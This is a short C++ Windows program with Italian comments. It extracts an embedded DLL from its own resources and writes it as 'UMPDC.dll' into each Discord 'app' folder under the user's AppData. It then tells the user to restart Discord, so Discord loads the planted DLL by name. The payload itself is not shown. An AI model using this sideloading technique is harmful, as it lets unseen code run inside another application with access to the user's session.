#include <iostream>
#include <filesystem>
#include <fstream>
#include <windows.h>
#include <lmcons.h>
#include <vector>
#include "resources.h"

namespace fs = std::filesystem;


std::vector<char> getResourceData()
{
    HMODULE hModule = GetModuleHandle(NULL);
    if (hModule == NULL) {
    throw std::runtime_error("Impossibile ottenere il handle del modulo corrente.");
    }
    HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(MY_DLL), RT_RCDATA);
    if (hResource == NULL) {
        throw std::runtime_error("Risorsa non trovata");
    }

    HGLOBAL hLoadedResource = LoadResource(hModule, hResource);
    if (hLoadedResource == NULL) {
       throw std::runtime_error("Impossibile caricare la risorsa");
    }

    DWORD resourceSize = SizeofResource(hModule, hResource);
    const char* resourceData = static_cast<const char*>(LockResource(hLoadedResource));

    return std::vector<char>(resourceData, resourceData + resourceSize);
}

// Funzione per salvare i dati della risorsa come file
void saveResourceDataToFile(const fs::path& filePath)
{
   std::vector<char> resourceData = getResourceData();
    std::ofstream outputFile(filePath, std::ios::binary);
    outputFile.write(resourceData.data(), resourceData.size());
}

std::string getSystemUsername()
{
    char username[UNLEN + 1];
    DWORD size = UNLEN + 1;

    if (GetUserNameA(username, &size))
    {
        return std::string(username);
    }

    return "";
}

int main()
{
    namespace fs = std::filesystem;

    std::string username = getSystemUsername();
    fs::path discordFolder = "C:\\Users\\" + username + "\\AppData\\Local\\Discord";

    // Cerca le cartelle che iniziano con "app" all'interno della cartella Discord
    for (const auto& entry : fs::directory_iterator(discordFolder)) {
        if (entry.is_directory()) {
            std::string folderName = entry.path().filename().string();
            if (folderName.find("app") == 0) {
                fs::path destinationFolder = entry.path()/ "UMPDC.dll" ;
                saveResourceDataToFile(destinationFolder);
            }
        }
    }
    MessageBoxW(NULL, L"Riavvia Discord per confermare l'installazione", L"Installazione Completata", MB_OK);
}
